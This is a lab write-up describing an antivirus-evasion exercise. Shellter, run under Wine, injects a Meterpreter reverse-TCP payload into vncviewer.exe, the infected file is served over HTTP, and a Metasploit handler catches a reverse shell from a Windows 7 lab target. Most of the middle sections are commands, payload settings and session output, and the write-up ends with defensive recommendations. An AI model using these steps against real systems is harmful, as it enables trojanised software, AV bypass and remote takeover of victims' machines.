---
title: "AV Evasion with Shellter"
description: "Using Shellter (under Wine) to inject a Meterpreter reverse-TCP payload into a legitimate Windows executable (vncviewer.exe), bypassing antivirus, then delivering it and catching a Meterpreter session on a Windows 7 target."
date: 2025-12-01
platform: "INE Labs"
difficulty: "Medium"
tags: ["AV Evasion", "Shellter", "Meterpreter", "Wine", "msfvenom", "Metasploit", "Windows"]
cover: "./photo7.png"
---

# AV Evasion with Shellter

**Classification:** Host & Network Penetration Testing / Exploitation<br>
**Target:** WIN7-PC (10.10.10.7) — Windows 7 (6.1 Build 7601 SP1)<br>
**Attacker:** 10.10.10.10 (Kali)

## 1. Executive Summary

**Shellter** is a dynamic PE infector that injects a payload into a real Windows executable
so the result looks and runs like the original program while the shellcode executes in the
background — defeating signature-based AV. Here we inject a **Meterpreter reverse_tcp**
payload into `vncviewer.exe`, deliver it to the target, and catch the session.

## 2. Setup

Installing Shellter and the 32-bit Wine packages (Shellter runs 32-bit payloads).

```bash
apt install shellter
dpkg --add-architecture i386 && apt update
apt install wine32
```

![Installing Shellter](./photo1.png)

![Installing Wine 32-bit packages](./photo2.png)

![Adding the i386 architecture](./photo3.png)

## 3. Running Shellter

```bash
cd /usr/share/windows-resources/shellter
wine shellter.exe
```

![Shellter location](./photo4.png)

![Running Shellter under Wine](./photo5.png)

Selecting the legitimate executable to infect (`vncviewer.exe`).

```
/usr/share/windows-binaries/vncviewer.exe
```

![Selecting vncviewer.exe](./photo6.png)

Choosing **Auto** mode and a **Listed Payload** (`meterpreter_reverse_tcp`, LHOST
`10.10.10.10`, LPORT `1234`); Shellter injects and verifies.

```
Injection: Verified!
```

![Shellter — Injection Verified](./photo7.png)

## 4. Delivery & Handler

Hosting the infected binary over HTTP.

```bash
sudo python3 -m http.server 80
```

![HTTP server hosting the payload](./photo8.png)

Setting up the matching handler.

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 1234
run
```

![multi/handler configured](./photo9.png)

The target downloads the infected `vncviewer.exe`.

![Target downloading the payload](./photo10.png)

## 5. Execution & Session

Running the program works as normal while the payload runs in the background.

![Running the infected executable](./photo11.png)

![HTTP server log — GET /vncviewer.exe](./photo12.png)

A Meterpreter session opens on WIN7-PC.

```
sysinfo    # WIN7-PC — Windows 7
getuid     # Win7-PC\Win7
```

![Meterpreter session opened](./photo13.png)

## 6. Remediation Recommendations

1. **Don't rely on signature AV alone** — use behaviour-based EDR that detects injected
   threads/suspicious child processes.
2. **Application allow-listing** (WDAC/AppLocker) with trusted publishers so modified
   binaries fail code-integrity checks.
3. **Block untrusted downloads/execution** (SmartScreen, MOTW, egress filtering).
4. **User awareness** — infected copies of legitimate tools are a common delivery vector.
